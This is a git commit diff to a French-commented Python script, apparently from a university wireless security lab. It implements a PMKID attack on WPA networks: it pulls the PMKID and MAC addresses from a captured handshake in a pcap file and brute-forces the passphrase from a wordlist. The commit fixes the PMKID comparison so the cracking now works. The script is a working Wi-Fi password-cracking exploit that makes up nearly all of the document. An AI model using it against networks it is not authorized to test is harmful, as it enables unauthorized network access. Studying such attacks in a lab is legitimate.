e268e6fa0eeed658da4210ba9bf3fbaf61266ebc
llievre <loic.lievre@heig-vd.ch>
2021-05-02 18:17:49 +0200

    script is working + clean

--- files/pmkid_attack.py
+++ files/pmkid_attack.py
@@ -37,11 +37,21 @@ def getFirstHandshake(packets, APmac):
     à l'aide de la mac de l'AP et du client
     """
     for packet in packets:
+        #va chercher un paquet de handshake
         if packet.haslayer(EAPOL) and packet.type == 2 and packet.subtype == 8:
             packetSrc = a2b_hex(packet.addr2.replace(":", ""))
             #retourne le premier handshake de l'AP trouvé
             if packet.FCfield == "from-DS" and packetSrc == APmac:
                 return packet
+
+def printStatus(passPhrase, ssid, APmac, Clientmac, pmkid):
+    print ("=============================")
+    if passPhrase != "":
+        print ("Passphrase: ",passPhrase,"\n")
+    print ("SSID: ",ssid,"\n")
+    print ("AP Mac: ",b2a_hex(APmac),"\n")
+    print ("CLient Mac: ",b2a_hex(Clientmac),"\n")
+    print ("PMKID: ", b2a_hex(pmkid),"\n")
 
 # Read capture file -- it contains beacon, authentication, associacion, handshake and data
 wpa=rdpcap("PMKID_handshake.pcap") 
@@ -50,24 +60,22 @@ wpa=rdpcap("PMKID_handshake.pcap")
 packetBroadcast = getBeacon(wpa)
 
 # Important parameters for key derivation - most of them can be obtained from the pcap file
-passPhrase  = "actuelle"
-A           = "Pairwise key expansion" #this string is used in the pseudo-random function
 ssid        = packetBroadcast.info #on recupere le ssid dans le beacon
 APmac       = a2b_hex(packetBroadcast.addr2.replace(":", "")) #on recupere la mac de l'ap dans le handshake 1
 packetHS1   = getFirstHandshake(wpa, APmac) #on va chercher le handshake 1
 Clientmac   = a2b_hex(packetHS1.addr1.replace(":", "")) #on recupere la mac du client dans le handshake 1
 pmkid = raw(packetHS1)[-20:-4] #on recupere le pmkid du handshake 1
 
+#montre les parametres avant les calculs
 print ("\n\nValues used to construct PMKID")
-print ("============================")
-print ("Passphrase: ",passPhrase,"\n")
-print ("SSID: ",ssid.decode(),"\n")
-print ("AP Mac: ",b2a_hex(APmac),"\n")
-print ("CLient Mac: ",b2a_hex(Clientmac),"\n")
-print ("PMKID: ", b2a_hex(pmkid),"\n")
+printStatus("", ssid, APmac, Clientmac, pmkid)
 
 #on ouvre le fichier de mots
 fileWords = open("wordslist.txt", "r")
+
+
+print("Computing...")
+print ("=============================")
 
 #on teste chaque mot du fichier
 for word in fileWords.readlines():
@@ -78,20 +86,13 @@ for word in fileWords.readlines():
     #calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
     pmk = pbkdf2(hashlib.sha1, passPhrase, ssid, 4096, 32)
 
+    #compute a pmkid
     wordPMKID = hmac.new(pmk, b"PMK Name" + APmac + Clientmac,hashlib.sha1)
-    
-    print(wordPMKID)
-    print(pmkid)
 
-    #on vérifie si les deux pmkid sont egaux
-    if wordPMKID == pmkid:
+    #on vérifie si les deux pmkid sont égaux
+    if wordPMKID.digest()[:16] == pmkid:
         print ("Correct passphrase : " + cleanWord)
-        print ("=============================")
-        print ("Passphrase: ",passPhrase,"\n")
-        print ("SSID: ",ssid,"\n")
-        print ("AP Mac: ",b2a_hex(APmac),"\n")
-        print ("CLient Mac: ",b2a_hex(Clientmac),"\n")
-        print ("PMKID: ", b2a_hex(pmkid),"\n")
+        printStatus(cleanWord, ssid, APmac, Clientmac, pmkid)
         exit()
     else:
         print("Wrong passphrase : " + cleanWord)
